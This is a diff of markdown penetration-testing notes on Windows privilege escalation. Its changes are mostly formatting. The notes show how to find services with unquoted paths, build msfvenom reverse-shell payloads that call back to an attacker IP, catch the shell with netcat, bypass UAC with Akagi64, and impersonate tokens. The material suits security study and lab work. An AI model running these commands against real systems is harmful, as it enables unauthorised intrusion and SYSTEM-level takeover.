@@ -888,10 +888,10 @@ https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation
 
 - Service name,pathname,displayname,startmode
 
-- `wmic service get name,pathname,displayname,startmode`
+    - `wmic service get name,pathname,displayname,startmode`
 
 
-- `wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v """`
+    - `wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v """`
 `
 /i means ignore the case
 /v means except <this argument> find others.
@@ -950,22 +950,22 @@ https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation
 ###### UnquotedServicePath
 
 - Find the unquoted service path
-- `wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v """`
+    - `wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v """`
 
 /i means ignore the case
 /v means except <this argument> find others.
 
 - Check if we/Users have write access to that folder using `icacls` 
 
-- `icacls "C:\Program Files\Zero Tier`
+    - `icacls "C:\Program Files\Zero Tier`
 
 - If write access is there, then generate payload with folder name where space starts.
 
-(non-meterpreter binary)
--  `msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.17.6.236 LPORT=4444 -f exe -o /home/kali/Zero.exe  ` 
+- (non-meterpreter binary)
+    -  `msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.17.6.236 LPORT=4444 -f exe -o /home/kali/Zero.exe  ` 
 
-(meterpreter binary)
-- `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.17.6.236 LPORT=4444 -f exe -o /home/kali/Zero.exe`
+- (meterpreter binary)
+    - `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.17.6.236 LPORT=4444 -f exe -o /home/kali/Zero.exe`
 
 
 - Transfer payload to target server by whatever method
@@ -973,7 +973,7 @@ https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation
 - Start listener on attacker machine
 
 (for non-meterpreter binary)
-- `nc -nlvp 4444`
+    - `nc -nlvp 4444`
 
 (for meterpreter binary)
 
@@ -981,13 +981,13 @@ https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation
 
 - Now start the service using cmd or poweshell
 
-- `net start zerotieroneservice`
+    - `net start zerotieroneservice`
 
-- `Start-Service zerotieroneservice`
+    - `Start-Service zerotieroneservice`
 
 - We get the reversehell with Privileged user/NT Authority
 
-**Privilege Escalation by Bypassing UAC prompt**
+###### Bypassing UAC prompt
 
 - Checking if user is part of Local Group Administrator
     - `net localgroup administrator`
@@ -1008,7 +1008,7 @@ https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation
     - Executing executable 
         - `.\Akagi64 23 C:\temp\backdoor.exe`
 
-**Privilege Escalation by Windows Access Tokens**
+###### Access Token Impersonation
     
 - Token Impersonation using Meterpreter Incognito module
 
